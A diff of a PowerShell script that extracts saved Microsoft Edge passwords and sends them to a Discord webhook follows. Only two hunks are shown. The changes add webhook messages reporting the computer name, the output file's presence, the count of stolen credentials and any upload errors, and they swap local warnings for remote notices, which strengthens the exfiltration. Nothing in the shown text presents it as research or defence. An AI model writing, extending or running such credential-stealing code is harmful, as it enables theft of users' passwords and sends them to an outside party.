@@ -7,7 +7,7 @@ if ([string]::IsNullOrEmpty($webhookUrl)) {
 }
 
 # Optional: Send immediate ping to confirm execution
-Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{ content = "✅ New script triggered on $env:COMPUTERNAME" } | ConvertTo-Json) -ContentType 'application/json'
+Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{ content = "New script triggered on $env:COMPUTERNAME" } | ConvertTo-Json) -ContentType 'application/json'
 
 # Check current PowerShell version
 if ($PSVersionTable.PSVersion.Major -lt 7) {
@@ -282,22 +282,38 @@ $edgeResults | ForEach-Object {
 
 Write-Host "Passwords saved to: $outputFile"
 
-# Send to Discord webhook using Invoke-RestMethod -Form to upload file properly
+#temp debugging
+# Check if output file exists
 if (Test-Path $outputFile) {
+    # Optional: notify about file presence
+    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
+        content = "Output file created at: $outputFile"
+    } | ConvertTo-Json) -ContentType 'application/json'
+
+    # Optional: show how many entries were found
+    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
+        content = "Edge credentials extracted: $($edgeResults.Count)"
+    } | ConvertTo-Json) -ContentType 'application/json'
+
+    # Proceed with file upload
     $form = @{
         content = "Extracted Edge Passwords:"
         file = Get-Item $outputFile
     }
     try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $form
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form $form
         Write-Host "Sent passwords to Discord webhook."
     }
     catch {
-        Write-Warning "Failed to send data to Discord webhook: $_"
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
+            content = "Upload failed: $($_.Exception.Message)"
+        } | ConvertTo-Json) -ContentType 'application/json'
     }
 }
 else {
-    Write-Warning "Output file not found: $outputFile"
+    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
+        content = "Output file missing: $outputFile"
+    } | ConvertTo-Json) -ContentType 'application/json'
 }
 
 # Cleanup temp folder, but skip DLL files if locked
